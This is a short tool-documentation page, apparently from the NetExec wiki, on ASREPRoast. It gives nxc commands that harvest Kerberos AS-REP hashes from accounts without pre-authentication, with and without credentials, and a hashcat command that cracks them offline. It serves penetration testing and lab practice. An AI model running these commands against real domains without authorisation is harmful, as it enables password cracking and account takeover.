---
description: >-
  Retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos
  pre-authentication required
---

# ASREPRoast

{% hint style="success" %}
You can retrieve the Kerberos 5 AS-REP etype 23 hash of users without Kerberos pre-authentication required if you have a list of users on the domain
{% endhint %}

### Without authentication

> The ASREPRoast attack looks for users without Kerberos pre-authentication required. That means that anyone can send an AS\_REQ request to the KDC on behalf of any of those users, and receive an AS\_REP message. This last kind of message contains a chunk of data encrypted with the original user key, derived from its password. Then, by using this message, the user password could be cracked offline. More detail in [Kerberos theory](https://www.tarlogic.com/en/blog/how-kerberos-works/).

```bash
nxc ldap 192.168.0.104 -u harry -p '' --asreproast output.txt
```

Using a wordlist, you can find wordlists of username here

```bash
nxc ldap 192.168.0.104 -u user.txt -p '' --asreproast output.txt
```

{% hint style="info" %}
Set the password value to '' to perform the test without authentication
{% endhint %}

### With authentication

If you have one valid credential on the domain, you can retrieve all the users and hashes where the Kerberos pre-authentication is not required

```bash
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt
```

{% hint style="info" %}
Use option **kdcHost** when the domain name resolution fail

```bash
nxc ldap 192.168.0.104 -u harry -p pass --asreproast output.txt --kdcHost domain_name
```
{% endhint %}

### Cracking with hashcat

To crack hashes on the file output.txt with hashcat use the following options:

```bash
hashcat -m18200 output.txt wordlist
```

### Example

Forest machine is a good example to test **ASREPRoast** with NetExec

{% embed url="https://www.hackthebox.eu/home/machines/profile/212" %}

### Ressources

{% embed url="https://www.tarlogic.com/en/blog/how-to-attack-kerberos/" %}

{% embed url="https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat" %}

{% embed url="https://en.hackndo.com/kerberos-asrep-roasting/" %}
